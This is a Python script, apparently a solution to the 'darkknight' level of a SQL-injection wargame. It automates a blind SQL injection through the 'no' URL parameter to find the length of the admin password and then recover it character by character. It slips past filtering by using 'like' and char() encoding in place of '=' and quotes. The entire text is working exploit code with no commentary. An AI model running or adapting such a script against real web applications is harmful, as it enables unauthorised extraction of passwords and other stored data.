from requests import get
import string
from time import sleep

url="https://los.eagle-jump.org/darkknight_~~~.php"
cookies = dict(PHPSESSID="")
special_strings = "~!@#$%^&*()+-_{}[]<>"
alpha = string.ascii_letters+string.digits+special_strings
result = ""

for i in range(1,20):
    parameter = "?pw=1&no=1 || length(pw) like "+str(i)
    new_url = url + parameter
    r = get(new_url, cookies=cookies)

    if r.text.find("Hello admin") > 0:
        length = i + 1
        print("password length is "+str(i))
        break
for i in range(1, length):
    for a in range(48,128):
        parameter ="?pw=1&no=1 || id like char(97,100,109,105,110) %26%26 mid(pw,"+str(i)+",1) like char("+str(a)+")"
        new_url = url + parameter
        r = get(new_url, cookies=cookies)

        if r.text.find("Hello admin") > 0:
            print(str(i) + " -> "+chr(a))
            result += chr(a)
            break

    if i == 1 and result == "":
        print("password not found")
        exit(0)

    if i == length-1:
        print("\npassword is"+result)
        print("\n")
